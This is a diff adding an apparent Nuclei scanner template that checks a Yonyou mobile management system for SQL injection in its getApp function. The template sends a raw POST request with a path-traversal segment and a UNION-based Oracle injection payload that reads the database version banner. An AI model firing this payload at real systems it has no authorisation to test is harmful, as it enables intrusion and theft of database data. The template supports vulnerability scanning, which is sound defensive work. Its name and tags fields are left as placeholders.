@@ -1,0 +1,29 @@
+id: yongyou-ydgl-getApp-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友移动管理系统 getApp 功能点未对用户的输入进行过滤，导致存在SQL注入漏洞，利用此漏洞攻击者可以获取数据库敏感信息及凭证，使系统处于极度不安全状态。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/Y19-1%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-SQL?id=y19-1%e7%94%a8%e5%8f%8b-%e7%a7%bb%e5%8a%a8%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f-sql
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /mobsm/common/../appManage/getApp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 212
+
+        pk_dvcmngmnt=0' union select banner,'test+SQLi',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from sys.v_$version where rownum=1--+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Oracle Database'
